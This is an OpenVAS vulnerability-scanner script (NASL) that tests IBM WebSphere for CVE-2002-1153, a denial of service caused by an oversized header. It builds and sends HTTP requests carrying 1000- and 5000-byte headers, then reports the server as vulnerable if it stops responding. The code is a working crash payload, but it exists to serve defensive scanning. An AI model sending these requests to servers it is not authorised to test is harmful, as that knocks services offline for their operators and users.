# OpenVAS Vulnerability Test
# $Id: websphere_too_long_header.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: WebSphere Host header overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to kill the WebSphere server by
sending an invalid request for a .jsp with a too long Host: header.

A cracker may exploit this vulnerability to make your web server
crash continually.";

tag_solution = "Install PQ62144";

# From:"Peter_Gründl" <pgrundl@kpmg.dk>
# To:"Full-Disclosure (netsys)" <full-disclosure@lists.netsys.com>
# Subject: KPMG-2002035: IBM Websphere Large Header DoS 
# Date: Thu, 19 Sep 2002 10:51:07 +0200

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11181");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(5749);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2002-1153");

 name = "WebSphere Host header overflow";
 script_name(name);
 

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nasl", "httpver.nasl", "http_version.nasl");
 script_require_keys("www/ibm-http");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

########

include("http_func.inc");


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

#
r1 = string("GET /foo.jsp HTTP/1.1\r\n Host: ", crap(1000), "\r\n\r\n");

send(socket:soc, data: r1);
r = http_recv(socket:soc);
http_close_socket(soc);

#
r2 = http_get(item:"/bar.jsp", port:port);
r2 = r2 - string("\r\n\r\n");
r2 = string(r2, "\r\n", "OpenVAS-Header: ", crap(5000), "\r\n\r\n");

soc = http_open_socket(port);
if (! soc)  { security_message(port); exit(0); }

send(socket:soc, data: r2);
r = http_recv(socket:soc);
http_close_socket(soc);
#

if (http_is_dead(port: port)) { security_message(port); exit(0); }
